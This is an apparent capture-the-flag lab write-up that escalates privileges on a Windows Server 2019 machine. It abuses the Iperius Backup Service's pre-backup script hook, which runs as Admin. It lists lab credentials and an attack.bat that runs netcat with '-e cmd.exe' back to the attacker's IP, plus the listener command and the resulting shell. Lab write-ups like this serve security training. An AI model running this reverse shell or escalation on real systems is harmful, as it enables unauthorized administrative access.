# They Lost The Plan! 

IP `10.10.149.249`

L: `mcskidy`

P: `Password1`

Protocol: `RDP`

## Users
```cmd
net users
```

```
User accounts for \\THE-GRINCH-HACK

-------------------------------------------------------------------------------
Administrator            Alabaster                DefaultAccount
Guest                    McSkidy                  pepper
Rudolph                  sugarplum                thegrinch
WDAGUtilityAccount
The command completed successfully.
```

## OS version
```cmd
systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
```

```
OS Name:                   Microsoft Windows Server 2019 Datacenter
OS Version:                10.0.17763 N/A Build 17763
```


## Installed services
```
wmic service list
```

## Vulnt service
`Iperius Backup Service` is vulnurable. It runs as Admin.

Create new backup. Any source and destination.
On the `Other processes` step we can add programs to run before and after backup.

They will run with Admin privilegues, because `Iperius Backup Service` runs as Admin!

So lets escalate!

### Prepare script

Create `attack.bat` file:

```bat
@echo off

C:\Users\McSkidy\Downloads\nc.exe <YOUR_IP> 8888  -e cmd.exe
```

### Lunch listener
On your machine start listener.

```cmd
nc -nlvp 8888 
```


### Setup
In Iperius set before script to `attack.bat`

Save and run backup.


In couple minutes, in our terminal we should see connection windows cmd prompt!

```bashnc -nlvp 8888 
Listening on 0.0.0.0 8888
Connection received on 10.10.149.249 49823
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Program Files (x86)\Iperius Backup> 
```


# FLAG

```cmd
type C:\Users\thegrinch\Documents\flag.txt
```

